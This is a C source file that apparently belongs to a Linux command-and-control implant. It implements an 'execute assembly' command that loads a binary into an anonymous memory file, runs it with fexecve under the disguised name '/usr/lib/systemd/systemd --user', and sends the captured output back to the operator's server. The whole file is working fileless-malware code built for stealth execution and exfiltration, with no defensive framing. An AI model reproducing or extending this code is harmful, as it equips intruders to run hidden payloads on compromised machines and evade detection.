#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/wait.h>
#include <liburing.h>
#include "functions/send/send2serv.h"
#include "functions/connection/connection.h"

void cmd_execute_assembly(struct io_uring *ring, int sockfd, const char *uuid, char *file) {

    srand(time(NULL));
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int charset_len = strlen(charset);

    int name_len = 6 + 1;
    char name[name_len + 1];
    for (int i = 0; i < name_len; i++) {
        int name_index = rand() % charset_len;
        name[i] = charset[name_index];
    }
    name[name_len] = '\0';
    char *const argv[] = {"/usr/lib/systemd/systemd", "--user", NULL};
    char *const envp[] = {NULL};

    // Create a pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        return;
    }

    // Fork child process
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);

        int fd = open("/home/azureuser/injected", O_RDONLY); //don't need this
        if (fd == -1) return;
        
        struct stat st;
        int rv = fstat(fd, &st);

        if (rv == -1) return;

        void *buffer = malloc(st.st_size); //size of binary
        if (buffer == NULL) return;
        //send_get (returns shellcode into buffer variable)

        ssize_t bytesRead = read(fd, buffer, st.st_size);
        if (bytesRead == -1) return;

        close(fd);
        int af = memfd_create(name, MFD_CLOEXEC);
        if (af == -1) return;
        
        ssize_t bytesWritten = write(af, buffer, st.st_size);
        if (bytesWritten == -1) return;

        fexecve(af, argv, envp);

        return;
    } else {
        close(pipefd[1]);
        
        char *output_buffer = NULL;
        size_t total_size = 0;
        char read_chunk[4096];
        ssize_t bytes_read;

        while ((bytes_read = read(pipefd[0], read_chunk, sizeof(read_chunk))) > 0) {
            output_buffer = realloc(output_buffer, total_size + bytes_read);

            if (output_buffer == NULL) {
                // Handle memory allocation error
                perror("realloc failed");
                break; 
            }

            memcpy(output_buffer + total_size, read_chunk, bytes_read);
            total_size += bytes_read;
        }
        send2serv(uuid, output_buffer, total_size);
        free(output_buffer);
    }

    close(pipefd[0]);
    waitpid(pid, NULL, 0);
}